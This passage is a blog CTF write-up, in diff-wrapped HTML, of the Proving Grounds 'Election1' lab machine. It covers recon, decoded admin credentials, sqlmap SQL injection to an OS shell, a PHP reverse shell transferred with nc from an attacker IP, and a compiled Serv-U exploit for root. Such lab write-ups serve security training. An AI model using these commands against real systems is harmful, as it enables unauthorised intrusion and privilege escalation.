+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-enum: 
+|   /robots.txt: Robots file
+|   /phpinfo.php: Possible information file
+|_  /phpmyadmin/: phpMyAdmin
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="2-enumeration"><span class="me-2">2. Enumeration</span><a href="#2-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="port-80"><span class="me-2">Port 80</span><a href="#port-80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p><a href="/../assets/img/pg/Election1/Untitled.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled.png" alt="Untitled" loading="lazy"></a></p>
+
+<blockquote>
+  <p>Robots.txt</p>
+
+</blockquote>
+
+<p><a href="http://192.168.233.211/robots.txt">http://192.168.233.211/robots.txt</a></p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%201.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%201.png" alt="Untitled" loading="lazy"></a></p>
+
+<blockquote>
+  <p>phpmyadmin</p>
+
+</blockquote>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%202.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%202.png" alt="Untitled" loading="lazy"></a></p>
+
+<blockquote>
+  <p>phpinfo.php</p>
+
+</blockquote>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%203.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%203.png" alt="Untitled" loading="lazy"></a></p>
+
+<blockquote>
+  <p>PHP Version 7.1.33-14</p>
+
+</blockquote>
+
+<p><strong>Fuzzing of directories and files</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>feroxbuster <span class="nt">-u</span> http://192.168.233.211/ <span class="nt">-k</span> <span class="nt">-C</span> 404,403,500 <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/dirb/big.txt <span class="nt">-x</span> php,asp,txt,xml,bak,log
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>output</p>
+
+<p>301      GET        9l       28w      321c http://192.168.216.211/election =&gt; http://192.168.216.211/election/
+301      GET        9l       28w      327c http://192.168.216.211/election/admin =&gt; http://192.168.216.211/election/admin/</p>
+<blockquote>
+
+</blockquote>
+
+<p><strong>CMS</strong></p>
+
+<p><a href="http://192.168.233.211/election/">http://192.168.233.211/election/</a></p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%204.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%204.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>here was access to the administrative dashboard.</p>
+
+<p><a href="http://192.168.216.211/election/card.php">http://192.168.216.211/election/card.php</a></p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%205.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%205.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Decryption with the magic tool.</p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%206.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%206.png" alt="Untitled" loading="lazy"></a></p>
+
+<blockquote>
+  <p>user:1234␊pass:Zxc123!@#</p>
+
+</blockquote>
+
+<p><a href="http://192.168.216.211/election/admin/">http://192.168.216.211/election/admin/</a></p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%207.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%207.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Access to the admin panel.</p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%208.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%208.png" alt="Untitled" loading="lazy"></a></p>
+
+<h2 id="3-exploitation"><span class="me-2">3. Exploitation</span><a href="#3-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>To realize this exploitation, I used the reference to the Election 2.0 vulnerability on the Medium website.</p>
+
+<p><a href="https://medium.com/@h.kehn1/election-2-0-authenticated-remote-code-execution-vulnerability-f603491adb74">https://medium.com/@h.kehn1/election-2-0-authenticated-remote-code-execution-vulnerability-f603491adb74</a></p>
+
+<p>Create a new ‘candidate’.</p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%209.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%209.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>To edit, Burp Suite was used to intercept the request.</p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2010.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2010.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Save the request.</p>
+
+<p>req</p>
+
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre><span class="no">POST</span> <span class="o">/</span><span class="n">election</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">ajax</span><span class="o">/</span><span class="n">op_kandidat</span><span class="mf">.</span><span class="n">php</span> <span class="no">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nc">Host</span><span class="o">:</span> <span class="mf">192.168.216.211</span>
+<span class="nc">User</span><span class="o">-</span><span class="nc">Agent</span><span class="o">:</span> <span class="nc">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="no">X11</span><span class="p">;</span> <span class="nc">Linux</span> <span class="n">x86_64</span><span class="p">;</span> <span class="n">rv</span><span class="o">:</span><span class="mf">109.0</span><span class="p">)</span> <span class="nc">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="nc">Firefox</span><span class="o">/</span><span class="mf">115.0</span>
+<span class="nc">Accept</span><span class="o">:</span> <span class="o">*/*</span>
+<span class="nc">Accept</span><span class="o">-</span><span class="nc">Language</span><span class="o">:</span> <span class="n">en</span><span class="o">-</span><span class="no">US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span>
+<span class="nc">Accept</span><span class="o">-</span><span class="nc">Encoding</span><span class="o">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span><span class="p">,</span> <span class="n">br</span>
+<span class="nc">Content</span><span class="o">-</span><span class="nc">Type</span><span class="o">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="no">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="nc">X</span><span class="o">-</span><span class="nc">Requested</span><span class="o">-</span><span class="nc">With</span><span class="o">:</span> <span class="nc">XMLHttpRequest</span>
+<span class="nc">Content</span><span class="o">-</span><span class="nc">Length</span><span class="o">:</span> <span class="mi">16</span>
+<span class="nc">Origin</span><span class="o">:</span> <span class="n">http</span><span class="o">://</span><span class="mf">192.168.216.211</span>
+<span class="nc">Connection</span><span class="o">:</span> <span class="n">close</span>
+<span class="nc">Referer</span><span class="o">:</span> <span class="n">http</span><span class="o">://</span><span class="mf">192.168.216.211</span><span class="o">/</span><span class="n">election</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">kandidat</span><span class="mf">.</span><span class="n">php</span><span class="o">?</span><span class="n">_added</span>
+<span class="nc">Cookie</span><span class="o">:</span> <span class="n">el_listing_panitia</span><span class="o">=</span><span class="mi">5</span><span class="p">;</span> <span class="n">el_mass_adding</span><span class="o">=</span><span class="kc">false</span><span class="p">;</span> <span class="n">el_listing_guru</span><span class="o">=</span><span class="mi">5</span><span class="p">;</span> <span class="no">PHPSESSID</span><span class="o">=</span><span class="mi">4</span><span class="n">b8evpp42r24ge0j3rcr5p8cl0</span><span class="p">;</span> <span class="n">el_lang</span><span class="o">=</span><span class="n">en</span><span class="o">-</span><span class="n">us</span>
+
+<span class="n">aksi</span><span class="o">=</span><span class="n">fetch</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">77</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>injection with sqlmap</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">-r</span> req <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--os-shell</span> <span class="nt">-p</span> <span class="nb">id</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2011.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2011.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Select [4] PHP</p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2012.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2012.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Select [4] brute force search</p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2013.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2013.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Getting the OS shell</p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2014.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2014.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Create the php reverse shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php <span class="nb">.</span>
+<span class="nb">mv </span>php-reverse-shell.php fl0k1.php
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2015.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2015.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>To send it with the nc tool</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="c">#KALI</span>
+rlwrap <span class="nt">-cAr</span> nc <span class="nt">-nlvp</span> 1234 &lt; fl0k1.php
+<span class="c">#TARGET</span>
+nc 192.168.45.190 1234 <span class="o">&gt;</span> fl0k1.php
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2016.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2016.png" alt="Untitled" loading="lazy"></a></p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2017.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2017.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Execute PHP reverse shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>php fl0k1.php
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Initial Access</p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2018.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2018.png" alt="Untitled" loading="lazy"></a></p>
+
+<h2 id="4-post-exploitation"><span class="me-2">4. Post-Exploitation</span><a href="#4-post-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>Importing the shell with python3</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<h3 id="41-lateral-escalation"><span class="me-2">4.1 Lateral Escalation</span><a href="#41-lateral-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Searching to log file</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>find / <span class="nt">-name</span> <span class="k">*</span>.log 2&gt;/dev/null
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2019.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2019.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Found the credentials admin</p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2020.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2020.png" alt="Untitled" loading="lazy"></a></p>
+
+<blockquote>
+  <p>user love: P@$$w0rd@123</p>
+
+</blockquote>
+
+<h3 id="42-privilege-escalation"><span class="me-2">4.2 Privilege Escalation</span><a href="#42-privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>su love <span class="c">#after put the pass P@$$w0rd@123</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Search for suid binaries</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2021.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2021.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Check the processes</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>ps aux | <span class="nb">grep </span>serv
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2022.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2022.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Search to public exploit (”serv-u exploit in google”) and found: <a href="https://www.exploit-db.com/exploits/47009">https://www.exploit-db.com/exploits/47009</a></p>
+
+<p>Instructions</p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2023.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2023.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Explanation:</p>
+
+<p>Serv-U is an FTP (File Transfer Protocol) server software that might be installed on the system. If there is a known vulnerability in this software and it is running with elevated privileges, it can be exploited to gain root access.</p>
+
+<p>Root Access</p>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2024.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2024.png" alt="Untitled" loading="lazy"></a></p>
+
+<p>Compile &amp; Run</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>gcc 47009.c <span class="nt">-o</span> pe <span class="o">&amp;&amp;</span> ./pe
+</pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="/../assets/img/pg/Election1/Untitled%2025.png" class="popup img-link  shimmer"><img src="/../assets/img/pg/Election1/Untitled%2025.png" alt="Untitled" loading="lazy"></a></p>
+
+  </div>
+
+  <div class="post-tail-wrapper text-muted">
+    <!-- categories -->
+    
+    <div class="post-meta mb-3">
+      <i class="far fa-folder-open fa-fw me-1"></i>
+      
+      <a href="/categories/ctf/">CTF</a>,
+      <a href="/categories/proving-grounds-play/">Proving Grounds - Play</a>
+    </div>
+    
+
+    <!-- tags -->
+    
+    <div class="post-tags">
+      <i class="fa fa-tags fa-fw me-1"></i>
+      
+      <a href="/tags/medium/" class="post-tag no-text-decoration">MEDIUM</a>
+      
+      <a href="/tags/linux/" class="post-tag no-text-decoration">Linux</a>
+      
+      <a href="/tags/web/" class="post-tag no-text-decoration">Web</a>
+      
+      <a href="/tags/exposed-credentials/" class="post-tag no-text-decoration">Exposed Credentials</a>
+      
+      <a href="/tags/cookie-misconfiguration/" class="post-tag no-text-decoration">Cookie Misconfiguration</a>
+      
+      <a href="/tags/sql-injection/" class="post-tag no-text-decoration">SQL Injection</a>
+      
+    </div>
+    
+
+    <div class="
+        post-tail-bottom
+        d-flex justify-content-between align-items-center mt-5 pb-2
+      ">
+      <div class="license-wrapper">
+        
+        
+
+        This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
+        
+      </div>
+
+      <!-- Post sharing snippet -->
+
+<div class="share-wrapper d-flex align-items-center">
+  <span class="share-label text-muted">Share</span>
+  <span class="share-icons">
+    
+    
+    
+
+    
+
+      
+
+      <a href="https://twitter.com/intent/tweet?text=Election1%20-%20&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FProving-Grounds-Play-Election1%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.facebook.com/sharer/sharer.php?title=Election1%20-%20&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FProving-Grounds-Play-Election1%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+        <i class="fa-fw fab fa-facebook-square"></i>
+      </a>
+    
+
+      
+
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FProving-Grounds-Play-Election1%2F&text=Election1%20-%20" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+        <i class="fa-fw fab fa-telegram"></i>
+      </a>
+    
+
+    <button
+      id="copy-link"
+      aria-label="Copy link"
+      class="btn small"
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Copy link"
+      data-title-succeed="Link copied successfully!"
+    >
+      <i class="fa-fw fas fa-link pe-none fs-6"></i>
+    </button>
+  </span>
+</div>
+
+    </div>
+    <!-- .post-tail-bottom -->
+  </div>
+  <!-- div.post-tail-wrapper -->
+</article>
+
+            
+          </main>
+
+          <!-- panel -->
+          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
+            <div class="access">
+              <!-- Get 5 last posted/updated posts -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <section id="access-lastmod">
+    <h2 class="panel-heading">Recently Updated</h2>
+    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/Proving-Gronds-Play-Stapler/">Stapler</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/Proving-Grounds-Play-Lampiao/">Lampião</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/Proving-Grounds-Play-Amaterasu/">Amaterasu</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/Proving-Grounds-Play-Blogger/">Blogger</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/Proving-Grounds-Play-Drift/">DriftingBlues6</a>
+        </li>
+      
+    </ul>
+  </section>
+  <!-- #access-lastmod -->
+
+
+              <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/easy/">EASY</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/dirty-cow/">Dirty Cow</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/insecure-file-upload/">Insecure File Upload</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/smb/">SMB</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/apport-cli-2-26-0/">apport-cli 2.26.0</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/cve-2023-1326/">CVE-2023-1326</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/cve-2023-23752/">CVE-2023-23752</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/joomla/">Joomla</a>
+      
+    </div>
+  </section>
+
+
+            </div>
+
+            
+              
+              
+
+
+
+  <section id="toc-wrapper" class="d-none ps-0 pe-4">
+    <h2 class="panel-heading ps-3 mb-2">Contents</h2>
+    <nav id="toc"></nav>
+  </section>
+
+
+            
+          </aside>
+        </div>
+
+        <div class="row">
+          <!-- tail -->
+          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              
+              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
+
+<!-- The total size of related posts -->
+
+
+<!-- An random integer that bigger than 0 -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  <aside id="related-posts" aria-labelledby="related-label">
+    <h3 class="mb-4" id="related-label">Further Reading</h3>
+    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
+      
+        <article class="col">
+          <a href="/posts/Proving-Gronds-Play-Stapler/" class="post-preview card h-100">
+            <div class="card-body">
